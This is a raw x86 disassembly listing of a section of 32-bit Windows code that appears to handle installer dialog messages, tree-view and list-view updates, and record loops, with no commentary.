  405084:	0f 84 97 00 00 00    	je     0x405121
  40508a:	8b 4d f4             	mov    -0xc(%ebp),%ecx
  40508d:	89 45 c4             	mov    %eax,-0x3c(%ebp)
  405090:	8b 02                	mov    (%edx),%eax
  405092:	6a 20                	push   $0x20
  405094:	89 4d ac             	mov    %ecx,-0x54(%ebp)
  405097:	59                   	pop    %ecx
  405098:	8b d0                	mov    %eax,%edx
  40509a:	c7 45 b0 02 00 ff ff 	movl   $0xffff0002,-0x50(%ebp)
  4050a1:	23 d1                	and    %ecx,%edx
  4050a3:	c7 45 b4 0d 00 00 00 	movl   $0xd,-0x4c(%ebp)
  4050aa:	a8 02                	test   $0x2,%al
  4050ac:	89 4d c0             	mov    %ecx,-0x40(%ebp)
  4050af:	89 5d d8             	mov    %ebx,-0x28(%ebp)
  4050b2:	89 55 bc             	mov    %edx,-0x44(%ebp)
  4050b5:	74 3a                	je     0x4050f1
  4050b7:	8d 45 ac             	lea    -0x54(%ebp),%eax
  4050ba:	c7 45 b4 4d 00 00 00 	movl   $0x4d,-0x4c(%ebp)
  4050c1:	50                   	push   %eax
  4050c2:	57                   	push   %edi
  4050c3:	68 32 11 00 00       	push   $0x1132
  4050c8:	c7 45 d4 01 00 00 00 	movl   $0x1,-0x2c(%ebp)
  4050cf:	ff 75 fc             	push   -0x4(%ebp)
  4050d2:	ff d6                	call   *%esi
  4050d4:	8b 0d 40 37 42 00    	mov    0x423740,%ecx
  4050da:	c7 45 e4 01 00 00 00 	movl   $0x1,-0x1c(%ebp)
  4050e1:	89 04 99             	mov    %eax,(%ecx,%ebx,4)
  4050e4:	a1 40 37 42 00       	mov    0x423740,%eax
  4050e9:	8b 04 98             	mov    (%eax,%ebx,4),%eax
  4050ec:	89 45 f4             	mov    %eax,-0xc(%ebp)
  4050ef:	eb 30                	jmp    0x405121
  4050f1:	a8 04                	test   $0x4,%al
  4050f3:	74 14                	je     0x405109
  4050f5:	ff 75 f4             	push   -0xc(%ebp)
  4050f8:	6a 03                	push   $0x3
  4050fa:	68 0a 11 00 00       	push   $0x110a
  4050ff:	ff 75 fc             	push   -0x4(%ebp)
  405102:	ff d6                	call   *%esi
  405104:	89 45 f4             	mov    %eax,-0xc(%ebp)
  405107:	eb 18                	jmp    0x405121
  405109:	8d 45 ac             	lea    -0x54(%ebp),%eax
  40510c:	50                   	push   %eax
  40510d:	57                   	push   %edi
  40510e:	68 32 11 00 00       	push   $0x1132
  405113:	ff 75 fc             	push   -0x4(%ebp)
  405116:	ff d6                	call   *%esi
  405118:	8b 0d 40 37 42 00    	mov    0x423740,%ecx
  40511e:	89 04 99             	mov    %eax,(%ecx,%ebx,4)
  405121:	8b 55 e8             	mov    -0x18(%ebp),%edx
  405124:	43                   	inc    %ebx
  405125:	81 c2 18 08 00 00    	add    $0x818,%edx
  40512b:	3b 1d ac a2 42 00    	cmp    0x42a2ac,%ebx
  405131:	89 55 e8             	mov    %edx,-0x18(%ebp)
  405134:	0f 8c 44 ff ff ff    	jl     0x40507e
  40513a:	39 7d e4             	cmp    %edi,-0x1c(%ebp)
  40513d:	75 19                	jne    0x405158
  40513f:	6a f0                	push   $0xfffffff0
  405141:	ff 75 fc             	push   -0x4(%ebp)
  405144:	ff 15 f4 81 40 00    	call   *0x4081f4
  40514a:	24 fb                	and    $0xfb,%al
  40514c:	50                   	push   %eax
  40514d:	6a f0                	push   $0xfffffff0
  40514f:	ff 75 fc             	push   -0x4(%ebp)
  405152:	ff 15 68 82 40 00    	call   *0x408268
  405158:	39 7d f0             	cmp    %edi,-0x10(%ebp)
  40515b:	75 18                	jne    0x405175
  40515d:	6a 05                	push   $0x5
  40515f:	ff 75 f8             	push   -0x8(%ebp)
  405162:	ff 15 50 82 40 00    	call   *0x408250
  405168:	ff 75 f8             	push   -0x8(%ebp)
  40516b:	e8 57 f3 ff ff       	call   0x4044c7
  405170:	e9 8e 03 00 00       	jmp    0x405503
  405175:	ff 75 fc             	push   -0x4(%ebp)
  405178:	e8 4a f3 ff ff       	call   0x4044c7
  40517d:	8b 5d e0             	mov    -0x20(%ebp),%ebx
  405180:	81 7d 0c 05 04 00 00 	cmpl   $0x405,0xc(%ebp)
  405187:	75 12                	jne    0x40519b
  405189:	33 c9                	xor    %ecx,%ecx
  40518b:	89 7d 10             	mov    %edi,0x10(%ebp)
  40518e:	41                   	inc    %ecx
  40518f:	c7 45 0c 0f 04 00 00 	movl   $0x40f,0xc(%ebp)
  405196:	89 4d 14             	mov    %ecx,0x14(%ebp)
  405199:	eb 03                	jmp    0x40519e
  40519b:	8b 4d 14             	mov    0x14(%ebp),%ecx
  40519e:	83 7d 0c 4e          	cmpl   $0x4e,0xc(%ebp)
  4051a2:	b8 13 04 00 00       	mov    $0x413,%eax
  4051a7:	74 09                	je     0x4051b2
  4051a9:	39 45 0c             	cmp    %eax,0xc(%ebp)
  4051ac:	0f 85 e4 00 00 00    	jne    0x405296
  4051b2:	39 45 0c             	cmp    %eax,0xc(%ebp)
  4051b5:	89 4d f4             	mov    %ecx,-0xc(%ebp)
  4051b8:	74 0d                	je     0x4051c7
  4051ba:	81 79 04 08 04 00 00 	cmpl   $0x408,0x4(%ecx)
  4051c1:	0f 85 cf 00 00 00    	jne    0x405296
  4051c7:	f6 05 7d a2 42 00 02 	testb  $0x2,0x42a27d
  4051ce:	75 76                	jne    0x405246
  4051d0:	39 45 0c             	cmp    %eax,0xc(%ebp)
  4051d3:	74 09                	je     0x4051de
  4051d5:	8b 4d 14             	mov    0x14(%ebp),%ecx
  4051d8:	83 79 08 fe          	cmpl   $0xfffffffe,0x8(%ecx)
  4051dc:	75 68                	jne    0x405246
  4051de:	33 c9                	xor    %ecx,%ecx
  4051e0:	39 45 0c             	cmp    %eax,0xc(%ebp)
  4051e3:	0f 95 c1             	setne  %cl
  4051e6:	51                   	push   %ecx
  4051e7:	ff 75 fc             	push   -0x4(%ebp)
  4051ea:	e8 5e fc ff ff       	call   0x404e4d
  4051ef:	3b c7                	cmp    %edi,%eax
  4051f1:	89 45 f0             	mov    %eax,-0x10(%ebp)
  4051f4:	7c 50                	jl     0x405246
  4051f6:	69 c0 18 08 00 00    	imul   $0x818,%eax,%eax
  4051fc:	8d 4c 18 08          	lea    0x8(%eax,%ebx,1),%ecx
  405200:	8b 01                	mov    (%ecx),%eax
  405202:	a8 10                	test   $0x10,%al
  405204:	75 40                	jne    0x405246
  405206:	a8 40                	test   $0x40,%al
  405208:	74 11                	je     0x40521b
  40520a:	35 80 00 00 00       	xor    $0x80,%eax
  40520f:	84 c0                	test   %al,%al
  405211:	79 04                	jns    0x405217
  405213:	0c 01                	or     $0x1,%al
  405215:	eb 07                	jmp    0x40521e
  405217:	24 fe                	and    $0xfe,%al
  405219:	eb 03                	jmp    0x40521e
  40521b:	83 f0 01             	xor    $0x1,%eax
  40521e:	ff 75 f0             	push   -0x10(%ebp)
  405221:	89 01                	mov    %eax,(%ecx)
  405223:	e8 55 bf ff ff       	call   0x40117d
  405228:	8b 45 f0             	mov    -0x10(%ebp),%eax
  40522b:	c7 45 0c 0f 04 00 00 	movl   $0x40f,0xc(%ebp)
  405232:	40                   	inc    %eax
  405233:	89 45 10             	mov    %eax,0x10(%ebp)
  405236:	a1 7c a2 42 00       	mov    0x42a27c,%eax
  40523b:	f7 d0                	not    %eax
  40523d:	c1 e8 08             	shr    $0x8,%eax
  405240:	83 e0 01             	and    $0x1,%eax
  405243:	89 45 14             	mov    %eax,0x14(%ebp)
  405246:	39 7d f4             	cmp    %edi,-0xc(%ebp)
  405249:	74 4b                	je     0x405296
  40524b:	8b 45 f4             	mov    -0xc(%ebp),%eax
  40524e:	81 78 08 3d fe ff ff 	cmpl   $0xfffffe3d,0x8(%eax)
  405255:	75 0e                	jne    0x405265
  405257:	ff 70 5c             	push   0x5c(%eax)
  40525a:	57                   	push   %edi
  40525b:	68 19 04 00 00       	push   $0x419
  405260:	ff 75 fc             	push   -0x4(%ebp)
  405263:	ff d6                	call   *%esi
  405265:	8b 45 f4             	mov    -0xc(%ebp),%eax
  405268:	81 78 08 39 fe ff ff 	cmpl   $0xfffffe39,0x8(%eax)
  40526f:	75 25                	jne    0x405296
  405271:	83 78 0c 02          	cmpl   $0x2,0xc(%eax)
  405275:	8b 40 5c             	mov    0x5c(%eax),%eax
  405278:	75 0f                	jne    0x405289
  40527a:	69 c0 18 08 00 00    	imul   $0x818,%eax,%eax
  405280:	8d 44 18 08          	lea    0x8(%eax,%ebx,1),%eax
  405284:	83 08 20             	orl    $0x20,(%eax)
  405287:	eb 0d                	jmp    0x405296
  405289:	69 c0 18 08 00 00    	imul   $0x818,%eax,%eax
  40528f:	8d 5c 18 08          	lea    0x8(%eax,%ebx,1),%ebx
  405293:	83 23 df             	andl   $0xffffffdf,(%ebx)
  405296:	81 7d 0c 11 01 00 00 	cmpl   $0x111,0xc(%ebp)
  40529d:	75 6f                	jne    0x40530e
  40529f:	66 81 7d 10 f9 03    	cmpw   $0x3f9,0x10(%ebp)
  4052a5:	0f 85 58 02 00 00    	jne    0x405503
  4052ab:	8b 45 10             	mov    0x10(%ebp),%eax
  4052ae:	c1 e8 10             	shr    $0x10,%eax
  4052b1:	66 3d 01 00          	cmp    $0x1,%ax
  4052b5:	0f 85 48 02 00 00    	jne    0x405503
  4052bb:	57                   	push   %edi
  4052bc:	57                   	push   %edi
  4052bd:	68 47 01 00 00       	push   $0x147
  4052c2:	ff 75 f8             	push   -0x8(%ebp)
  4052c5:	ff d6                	call   *%esi
  4052c7:	83 f8 ff             	cmp    $0xffffffff,%eax
  4052ca:	0f 84 33 02 00 00    	je     0x405503
  4052d0:	57                   	push   %edi
  4052d1:	50                   	push   %eax
  4052d2:	68 50 01 00 00       	push   $0x150
  4052d7:	ff 75 f8             	push   -0x8(%ebp)
  4052da:	ff d6                	call   *%esi
  4052dc:	8b d8                	mov    %eax,%ebx
  4052de:	83 fb ff             	cmp    $0xffffffff,%ebx
  4052e1:	74 08                	je     0x4052eb
  4052e3:	8b 45 ec             	mov    -0x14(%ebp),%eax
  4052e6:	39 3c 98             	cmp    %edi,(%eax,%ebx,4)
  4052e9:	75 03                	jne    0x4052ee
  4052eb:	6a 20                	push   $0x20
  4052ed:	5b                   	pop    %ebx
  4052ee:	53                   	push   %ebx
  4052ef:	e8 a5 bf ff ff       	call   0x401299
  4052f4:	53                   	push   %ebx
  4052f5:	57                   	push   %edi
  4052f6:	68 20 04 00 00       	push   $0x420
  4052fb:	ff 75 08             	push   0x8(%ebp)
  4052fe:	ff d6                	call   *%esi
  405300:	83 4d 10 ff          	orl    $0xffffffff,0x10(%ebp)
  405304:	89 7d 14             	mov    %edi,0x14(%ebp)
  405307:	c7 45 0c 0f 04 00 00 	movl   $0x40f,0xc(%ebp)
  40530e:	81 7d 0c 00 02 00 00 	cmpl   $0x200,0xc(%ebp)
  405315:	75 0c                	jne    0x405323
  405317:	57                   	push   %edi
  405318:	57                   	push   %edi
  405319:	68 00 02 00 00       	push   $0x200
  40531e:	ff 75 fc             	push   -0x4(%ebp)
  405321:	ff d6                	call   *%esi
  405323:	81 7d 0c 0b 04 00 00 	cmpl   $0x40b,0xc(%ebp)
  40532a:	75 32                	jne    0x40535e
  40532c:	a1 2c 37 42 00       	mov    0x42372c,%eax
  405331:	3b c7                	cmp    %edi,%eax
  405333:	74 07                	je     0x40533c
  405335:	50                   	push   %eax
  405336:	ff 15 40 80 40 00    	call   *0x408040
  40533c:	a1 40 37 42 00       	mov    0x423740,%eax
  405341:	3b c7                	cmp    %edi,%eax
  405343:	74 07                	je     0x40534c
  405345:	50                   	push   %eax
  405346:	ff 15 34 81 40 00    	call   *0x408134
  40534c:	89 3d 2c 37 42 00    	mov    %edi,0x42372c
  405352:	89 3d 40 37 42 00    	mov    %edi,0x423740
  405358:	89 3d e0 a2 42 00    	mov    %edi,0x42a2e0
  40535e:	81 7d 0c 0f 04 00 00 	cmpl   $0x40f,0xc(%ebp)
  405365:	0f 85 5a 01 00 00    	jne    0x4054c5
  40536b:	57                   	push   %edi
  40536c:	57                   	push   %edi
  40536d:	e8 7d be ff ff       	call   0x4011ef
  405372:	8b 45 10             	mov    0x10(%ebp),%eax
  405375:	3b c7                	cmp    %edi,%eax
  405377:	74 0e                	je     0x405387
  405379:	83 f8 ff             	cmp    $0xffffffff,%eax
  40537c:	74 01                	je     0x40537f
  40537e:	48                   	dec    %eax
  40537f:	50                   	push   %eax
  405380:	6a 08                	push   $0x8
  405382:	e8 46 fb ff ff       	call   0x404ecd
  405387:	39 7d 14             	cmp    %edi,0x14(%ebp)
  40538a:	74 3f                	je     0x4053cb
  40538c:	ff 35 40 37 42 00    	push   0x423740
  405392:	e8 4b bf ff ff       	call   0x4012e2
  405397:	8b d8                	mov    %eax,%ebx
  405399:	53                   	push   %ebx
  40539a:	e8 fa be ff ff       	call   0x401299
  40539f:	33 c0                	xor    %eax,%eax
  4053a1:	33 c9                	xor    %ecx,%ecx
  4053a3:	3b df                	cmp    %edi,%ebx
  4053a5:	7e 0e                	jle    0x4053b5
  4053a7:	8b 55 ec             	mov    -0x14(%ebp),%edx
  4053aa:	39 3c 82             	cmp    %edi,(%edx,%eax,4)
  4053ad:	74 01                	je     0x4053b0
  4053af:	41                   	inc    %ecx
  4053b0:	40                   	inc    %eax
  4053b1:	3b c3                	cmp    %ebx,%eax
  4053b3:	7c f2                	jl     0x4053a7
  4053b5:	57                   	push   %edi
  4053b6:	51                   	push   %ecx
  4053b7:	68 4e 01 00 00       	push   $0x14e
  4053bc:	ff 75 f8             	push   -0x8(%ebp)
  4053bf:	ff d6                	call   *%esi
  4053c1:	89 5d 14             	mov    %ebx,0x14(%ebp)
  4053c4:	c7 45 0c 20 04 00 00 	movl   $0x420,0xc(%ebp)
  4053cb:	57                   	push   %edi
  4053cc:	57                   	push   %edi
  4053cd:	e8 1d be ff ff       	call   0x4011ef
  4053d2:	a1 40 37 42 00       	mov    0x423740,%eax
  4053d7:	39 3d ac a2 42 00    	cmp    %edi,0x42a2ac
  4053dd:	89 45 e0             	mov    %eax,-0x20(%ebp)
  4053e0:	a1 a8 a2 42 00       	mov    0x42a2a8,%eax
  4053e5:	c7 45 c4 30 f0 00 00 	movl   $0xf030,-0x3c(%ebp)
  4053ec:	89 7d f0             	mov    %edi,-0x10(%ebp)
  4053ef:	0f 8e 9c 00 00 00    	jle    0x405491
  4053f5:	8d 58 08             	lea    0x8(%eax),%ebx
  4053f8:	8b 45 e0             	mov    -0x20(%ebp),%eax
  4053fb:	8b 4d f0             	mov    -0x10(%ebp),%ecx
  4053fe:	8b 04 88             	mov    (%eax,%ecx,4),%eax
  405401:	3b c7                	cmp    %edi,%eax
  405403:	74 74                	je     0x405479
  405405:	8b 0b                	mov    (%ebx),%ecx
  405407:	89 45 bc             	mov    %eax,-0x44(%ebp)
  40540a:	f6 c5 01             	test   $0x1,%ch
  40540d:	c7 45 b8 08 00 00 00 	movl   $0x8,-0x48(%ebp)
  405414:	74 11                	je     0x405427
  405416:	8d 43 10             	lea    0x10(%ebx),%eax
  405419:	c7 45 b8 09 00 00 00 	movl   $0x9,-0x48(%ebp)
  405420:	89 45 c8             	mov    %eax,-0x38(%ebp)
  405423:	80 63 01 fe          	andb   $0xfe,0x1(%ebx)
  405427:	f6 c1 40             	test   $0x40,%cl
  40542a:	74 05                	je     0x405431
  40542c:	6a 03                	push   $0x3
  40542e:	58                   	pop    %eax
  40542f:	eb 0e                	jmp    0x40543f
  405431:	8b c1                	mov    %ecx,%eax
  405433:	83 e0 01             	and    $0x1,%eax
  405436:	40                   	inc    %eax
  405437:	f6 c1 10             	test   $0x10,%cl
  40543a:	74 03                	je     0x40543f
  40543c:	83 c0 03             	add    $0x3,%eax
  40543f:	8b d1                	mov    %ecx,%edx
  405441:	ff 75 bc             	push   -0x44(%ebp)
  405444:	c1 e0 0b             	shl    $0xb,%eax
  405447:	83 e2 08             	and    $0x8,%edx
  40544a:	0b c2                	or     %edx,%eax
  40544c:	8b d1                	mov    %ecx,%edx
  40544e:	c1 f9 05             	sar    $0x5,%ecx
  405451:	03 c0                	add    %eax,%eax
  405453:	83 e2 20             	and    $0x20,%edx
  405456:	83 e1 01             	and    $0x1,%ecx
  405459:	0b c2                	or     %edx,%eax
  40545b:	41                   	inc    %ecx
  40545c:	89 45 c0             	mov    %eax,-0x40(%ebp)
  40545f:	51                   	push   %ecx
  405460:	68 02 11 00 00       	push   $0x1102
  405465:	ff 75 fc             	push   -0x4(%ebp)
  405468:	ff d6                	call   *%esi
  40546a:	8d 45 b8             	lea    -0x48(%ebp),%eax
  40546d:	50                   	push   %eax
  40546e:	57                   	push   %edi
  40546f:	68 3f 11 00 00       	push   $0x113f
  405474:	ff 75 fc             	push   -0x4(%ebp)
  405477:	ff d6                	call   *%esi
  405479:	ff 45 f0             	incl   -0x10(%ebp)
  40547c:	81 c3 18 08 00 00    	add    $0x818,%ebx
  405482:	8b 45 f0             	mov    -0x10(%ebp),%eax
  405485:	3b 05 ac a2 42 00    	cmp    0x42a2ac,%eax
  40548b:	0f 8c 67 ff ff ff    	jl     0x4053f8
  405491:	66 83 3d 6c a2 42 00 	cmpw   $0x4,0x42a26c
  405498:	04 
  405499:	75 0c                	jne    0x4054a7
  40549b:	6a 01                	push   $0x1
  40549d:	57                   	push   %edi
  40549e:	ff 75 fc             	push   -0x4(%ebp)
  4054a1:	ff 15 7c 82 40 00    	call   *0x40827c
  4054a7:	a1 3c 92 42 00       	mov    0x42923c,%eax
  4054ac:	39 78 10             	cmp    %edi,0x10(%eax)
  4054af:	74 14                	je     0x4054c5
  4054b1:	6a 05                	push   $0x5
  4054b3:	e8 68 f9 ff ff       	call   0x404e20
  4054b8:	50                   	push   %eax
  4054b9:	6a fb                	push   $0xfffffffb
  4054bb:	68 ff 03 00 00       	push   $0x3ff
  4054c0:	e8 43 f9 ff ff       	call   0x404e08
  4054c5:	81 7d 0c 20 04 00 00 	cmpl   $0x420,0xc(%ebp)
  4054cc:	75 35                	jne    0x405503
  4054ce:	f6 05 7d a2 42 00 01 	testb  $0x1,0x42a27d
  4054d5:	74 2c                	je     0x405503
  4054d7:	33 c0                	xor    %eax,%eax
  4054d9:	83 7d 14 20          	cmpl   $0x20,0x14(%ebp)
  4054dd:	8b 35 50 82 40 00    	mov    0x408250,%esi
  4054e3:	0f 94 c0             	sete   %al
  4054e6:	c1 e0 03             	shl    $0x3,%eax
  4054e9:	8b f8                	mov    %eax,%edi
  4054eb:	57                   	push   %edi
  4054ec:	ff 75 fc             	push   -0x4(%ebp)
  4054ef:	ff d6                	call   *%esi
  4054f1:	57                   	push   %edi
  4054f2:	68 fe 03 00 00       	push   $0x3fe
  4054f7:	ff 75 08             	push   0x8(%ebp)
  4054fa:	ff 15 64 82 40 00    	call   *0x408264
  405500:	50                   	push   %eax
  405501:	ff d6                	call   *%esi
  405503:	ff 75 14             	push   0x14(%ebp)
  405506:	ff 75 10             	push   0x10(%ebp)
  405509:	ff 75 0c             	push   0xc(%ebp)
  40550c:	e8 e8 ef ff ff       	call   0x4044f9
  405511:	5f                   	pop    %edi
  405512:	5e                   	pop    %esi
  405513:	5b                   	pop    %ebx
  405514:	c9                   	leave
  405515:	c2 10 00             	ret    $0x10
  405518:	55                   	push   %ebp
  405519:	8b ec                	mov    %esp,%ebp
  40551b:	53                   	push   %ebx
  40551c:	8b 5d 0c             	mov    0xc(%ebp),%ebx
  40551f:	81 fb 02 01 00 00    	cmp    $0x102,%ebx
  405525:	57                   	push   %edi
  405526:	75 14                	jne    0x40553c
  405528:	83 7d 10 20          	cmpl   $0x20,0x10(%ebp)
  40552c:	75 59                	jne    0x405587
  40552e:	68 13 04 00 00       	push   $0x413
  405533:	e8 a6 ef ff ff       	call   0x4044de
  405538:	33 c0                	xor    %eax,%eax
  40553a:	eb 62                	jmp    0x40559e
  40553c:	81 fb 00 02 00 00    	cmp    $0x200,%ebx
  405542:	75 20                	jne    0x405564
  405544:	ff 75 08             	push   0x8(%ebp)
  405547:	ff 15 dc 81 40 00    	call   *0x4081dc
  40554d:	85 c0                	test   %eax,%eax
  40554f:	74 36                	je     0x405587
  405551:	6a 01                	push   $0x1
  405553:	ff 75 08             	push   0x8(%ebp)
  405556:	e8 f2 f8 ff ff       	call   0x404e4d
  40555b:	8b f8                	mov    %eax,%edi
  40555d:	bb 19 04 00 00       	mov    $0x419,%ebx
  405562:	eb 03                	jmp    0x405567
  405564:	8b 7d 14             	mov    0x14(%ebp),%edi
  405567:	81 fb 19 04 00 00    	cmp    $0x419,%ebx
  40556d:	75 1b                	jne    0x40558a
  40556f:	39 3d 34 37 42 00    	cmp    %edi,0x423734
  405575:	74 13                	je     0x40558a
  405577:	57                   	push   %edi
  405578:	6a 06                	push   $0x6
  40557a:	89 3d 34 37 42 00    	mov    %edi,0x423734
  405580:	e8 48 f9 ff ff       	call   0x404ecd
  405585:	eb 03                	jmp    0x40558a
  405587:	8b 7d 14             	mov    0x14(%ebp),%edi
  40558a:	57                   	push   %edi
  40558b:	ff 75 10             	push   0x10(%ebp)
  40558e:	53                   	push   %ebx
  40558f:	ff 75 08             	push   0x8(%ebp)
  405592:	ff 35 3c 37 42 00    	push   0x42373c
  405598:	ff 15 e0 81 40 00    	call   *0x4081e0
  40559e:	5f                   	pop    %edi
  40559f:	5b                   	pop    %ebx
  4055a0:	5d                   	pop    %ebp
  4055a1:	c2 10 00             	ret    $0x10
  4055a4:	55                   	push   %ebp
  4055a5:	8b ec                	mov    %esp,%ebp
  4055a7:	83 ec 30             	sub    $0x30,%esp
  4055aa:	a1 44 92 42 00       	mov    0x429244,%eax
  4055af:	53                   	push   %ebx
  4055b0:	56                   	push   %esi
  4055b1:	57                   	push   %edi
  4055b2:	33 ff                	xor    %edi,%edi
  4055b4:	89 45 fc             	mov    %eax,-0x4(%ebp)
  4055b7:	3b c7                	cmp    %edi,%eax
  4055b9:	0f 84 b1 00 00 00    	je     0x405670
  4055bf:	8b 1d 34 a3 42 00    	mov    0x42a334,%ebx
  4055c5:	be 28 27 42 00       	mov    $0x422728,%esi
  4055ca:	89 5d f8             	mov    %ebx,-0x8(%ebp)
  4055cd:	83 e3 01             	and    $0x1,%ebx
  4055d0:	75 09                	jne    0x4055db
  4055d2:	ff 75 08             	push   0x8(%ebp)
  4055d5:	56                   	push   %esi
  4055d6:	e8 9e 0f 00 00       	call   0x406579
  4055db:	56                   	push   %esi
  4055dc:	e8 71 0f 00 00       	call   0x406552
  4055e1:	39 7d 0c             	cmp    %edi,0xc(%ebp)
  4055e4:	89 45 08             	mov    %eax,0x8(%ebp)
  4055e7:	74 1b                	je     0x405604
  4055e9:	ff 75 0c             	push   0xc(%ebp)
  4055ec:	e8 61 0f 00 00       	call   0x406552
  4055f1:	03 45 08             	add    0x8(%ebp),%eax
  4055f4:	3d 00 10 00 00       	cmp    $0x1000,%eax
  4055f9:	73 75                	jae    0x405670
  4055fb:	ff 75 0c             	push   0xc(%ebp)
  4055fe:	56                   	push   %esi
  4055ff:	e8 54 0f 00 00       	call   0x406558
  405604:	f6 45 f8 04          	testb  $0x4,-0x8(%ebp)
  405608:	75 0d                	jne    0x405617
  40560a:	56                   	push   %esi
  40560b:	ff 35 28 92 42 00    	push   0x429228
  405611:	ff 15 44 82 40 00    	call   *0x408244
  405617:	f6 45 f8 02          	testb  $0x2,-0x8(%ebp)
  40561b:	75 44                	jne    0x405661
  40561d:	57                   	push   %edi
  40561e:	57                   	push   %edi
  40561f:	68 04 10 00 00       	push   $0x1004
  405624:	89 75 e4             	mov    %esi,-0x1c(%ebp)
  405627:	ff 75 fc             	push   -0x4(%ebp)
  40562a:	8b 35 80 82 40 00    	mov    0x408280,%esi
  405630:	c7 45 d0 01 00 00 00 	movl   $0x1,-0x30(%ebp)
  405637:	ff d6                	call   *%esi
  405639:	2b c3                	sub    %ebx,%eax
  40563b:	89 7d d8             	mov    %edi,-0x28(%ebp)
  40563e:	89 45 d4             	mov    %eax,-0x2c(%ebp)
  405641:	8d 45 d0             	lea    -0x30(%ebp),%eax
  405644:	50                   	push   %eax
  405645:	b8 4d 10 00 00       	mov    $0x104d,%eax
  40564a:	2b c3                	sub    %ebx,%eax
  40564c:	57                   	push   %edi
  40564d:	50                   	push   %eax
  40564e:	ff 75 fc             	push   -0x4(%ebp)
  405651:	ff d6                	call   *%esi
  405653:	57                   	push   %edi
  405654:	ff 75 d4             	push   -0x2c(%ebp)
  405657:	68 13 10 00 00       	push   $0x1013
  40565c:	ff 75 fc             	push   -0x4(%ebp)
  40565f:	ff d6                	call   *%esi
  405661:	3b df                	cmp    %edi,%ebx
  405663:	74 0b                	je     0x405670
  405665:	8b 45 08             	mov    0x8(%ebp),%eax
  405668:	66 89 3c 45 28 27 42 	mov    %di,0x422728(,%eax,2)
  40566f:	00 
  405670:	5f                   	pop    %edi
  405671:	5e                   	pop    %esi
  405672:	5b                   	pop    %ebx
  405673:	c9                   	leave
  405674:	c2 08 00             	ret    $0x8
  405677:	56                   	push   %esi
  405678:	8b 35 a8 a2 42 00    	mov    0x42a2a8,%esi
  40567e:	57                   	push   %edi
  40567f:	8b 3d ac a2 42 00    	mov    0x42a2ac,%edi
  405685:	6a 00                	push   $0x0
  405687:	ff 15 98 82 40 00    	call   *0x408298
  40568d:	09 05 38 a3 42 00    	or     %eax,0x42a338
  405693:	6a 00                	push   $0x0
  405695:	e8 44 ee ff ff       	call   0x4044de
  40569a:	85 ff                	test   %edi,%edi
  40569c:	74 2b                	je     0x4056c9
  40569e:	83 c6 0c             	add    $0xc,%esi
  4056a1:	4f                   	dec    %edi
  4056a2:	f6 46 fc 01          	testb  $0x1,-0x4(%esi)
  4056a6:	74 0f                	je     0x4056b7
  4056a8:	ff 74 24 0c          	push   0xc(%esp)
  4056ac:	ff 36                	push   (%esi)
  4056ae:	e8 d6 bc ff ff       	call   0x401389
  4056b3:	85 c0                	test   %eax,%eax
  4056b5:	75 0c                	jne    0x4056c3
  4056b7:	81 c6 18 08 00 00    	add    $0x818,%esi
  4056bd:	85 ff                	test   %edi,%edi
  4056bf:	75 e0                	jne    0x4056a1
  4056c1:	eb 06                	jmp    0x4056c9
  4056c3:	ff 05 0c a3 42 00    	incl   0x42a30c
  4056c9:	68 04 04 00 00       	push   $0x404
  4056ce:	e8 0b ee ff ff       	call   0x4044de
  4056d3:	ff 15 9c 82 40 00    	call   *0x40829c
  4056d9:	a1 0c a3 42 00       	mov    0x42a30c,%eax
  4056de:	5f                   	pop    %edi
  4056df:	5e                   	pop    %esi
  4056e0:	c2 04 00             	ret    $0x4
  4056e3:	55                   	push   %ebp
  4056e4:	8b ec                	mov    %esp,%ebp
  4056e6:	83 ec 40             	sub    $0x40,%esp
  4056e9:	53                   	push   %ebx
  4056ea:	56                   	push   %esi
  4056eb:	8b 35 44 92 42 00    	mov    0x429244,%esi
  4056f1:	33 db                	xor    %ebx,%ebx
  4056f3:	81 7d 0c 10 01 00 00 	cmpl   $0x110,0xc(%ebp)
  4056fa:	57                   	push   %edi
  4056fb:	89 75 fc             	mov    %esi,-0x4(%ebp)
  4056fe:	0f 85 89 01 00 00    	jne    0x40588d
  405704:	83 4d d0 ff          	orl    $0xffffffff,-0x30(%ebp)
  405708:	83 4d dc ff          	orl    $0xffffffff,-0x24(%ebp)
  40570c:	6a 02                	push   $0x2
  40570e:	33 c0                	xor    %eax,%eax
  405710:	5e                   	pop    %esi
  405711:	8d 7d e0             	lea    -0x20(%ebp),%edi
  405714:	89 75 c8             	mov    %esi,-0x38(%ebp)
  405717:	89 5d cc             	mov    %ebx,-0x34(%ebp)
  40571a:	89 5d d4             	mov    %ebx,-0x2c(%ebp)
  40571d:	89 5d d8             	mov    %ebx,-0x28(%ebp)
  405720:	ab                   	stos   %eax,%es:(%edi)
  405721:	ab                   	stos   %eax,%es:(%edi)
  405722:	a1 74 a2 42 00       	mov    0x42a274,%eax
  405727:	8b 3d 64 82 40 00    	mov    0x408264,%edi
  40572d:	68 03 04 00 00       	push   $0x403
  405732:	8b 48 5c             	mov    0x5c(%eax),%ecx
  405735:	8b 40 60             	mov    0x60(%eax),%eax
  405738:	ff 75 08             	push   0x8(%ebp)
  40573b:	89 4d 0c             	mov    %ecx,0xc(%ebp)
  40573e:	89 45 10             	mov    %eax,0x10(%ebp)
  405741:	ff d7                	call   *%edi
  405743:	68 ee 03 00 00       	push   $0x3ee
  405748:	a3 30 92 42 00       	mov    %eax,0x429230
  40574d:	ff 75 08             	push   0x8(%ebp)
  405750:	ff d7                	call   *%edi
  405752:	68 f8 03 00 00       	push   $0x3f8
  405757:	a3 28 92 42 00       	mov    %eax,0x429228
  40575c:	ff 75 08             	push   0x8(%ebp)
  40575f:	ff d7                	call   *%edi
  405761:	ff 35 30 92 42 00    	push   0x429230
  405767:	a3 44 92 42 00       	mov    %eax,0x429244
  40576c:	89 45 fc             	mov    %eax,-0x4(%ebp)
  40576f:	e8 53 ed ff ff       	call   0x4044c7
  405774:	6a 04                	push   $0x4
  405776:	e8 a5 f6 ff ff       	call   0x404e20
  40577b:	a3 34 92 42 00       	mov    %eax,0x429234
  405780:	8d 45 e8             	lea    -0x18(%ebp),%eax
  405783:	50                   	push   %eax
  405784:	89 1d 4c 92 42 00    	mov    %ebx,0x42924c
  40578a:	ff 75 fc             	push   -0x4(%ebp)
  40578d:	ff 15 94 81 40 00    	call   *0x408194
  405793:	56                   	push   %esi
  405794:	ff 15 c0 81 40 00    	call   *0x4081c0
  40579a:	8b 4d f0             	mov    -0x10(%ebp),%ecx
  40579d:	8b 35 80 82 40 00    	mov    0x408280,%esi
  4057a3:	2b c8                	sub    %eax,%ecx
  4057a5:	8d 45 c8             	lea    -0x38(%ebp),%eax
